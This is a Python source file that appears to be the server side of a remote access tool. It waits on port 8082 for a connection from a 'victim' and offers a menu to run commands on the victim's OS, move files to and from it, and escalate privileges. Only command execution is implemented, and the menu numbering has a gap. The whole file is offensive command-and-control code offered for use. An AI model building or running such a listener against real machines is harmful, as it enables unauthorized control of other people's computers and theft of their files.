from core.connection.conn import *
from core.features.command import *

def show_options():
    print("[ 01 ] Run Command on victim OS")
    print("[ 02 ] Upload File to victim ")
    print("[ 03 ] Download File from victim")
    print("[ 05 ] Download Folder to victim")
    print("[ 06 ] Escalate privilages")

def send_2_client(socket, user_input):
    data_in_bytes = bytes(user_input, "utf-8")
    socket.send(data_in_bytes)


def select_option(socket):
    show_options()
    user_input = input("[+] Enter the option you want to select : ")
    send_2_client(socket, user_input)
    if user_input == "1":
        print("[+] Running Command")
        run_command(socket)
    elif user_input == "2":
        print("[+] Downloading File")
    elif user_input == "99":
        print("[+] Exiting ")
        return False
    else:
        print("[+] Invalid command")

    return True

if __name__ == "__main__":
    server_ip = ""
    server_port = 8082
    print("[+] Waiting for incoming connection")
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.bind((server_ip, server_port))
    socket.listen(5)
    keep_alive = True
    while keep_alive:
        try:
            conn, client_address = socket.accept()
            print("[+] Connection established with ", client_address)
            loopControl = True
            while loopControl:
                loopControl = select_option(conn)
                keep_alive = False
            conn.close()
        except ConnectionError:
            print("[+] Connection Error")
            keep_alive = False
            socket.close()
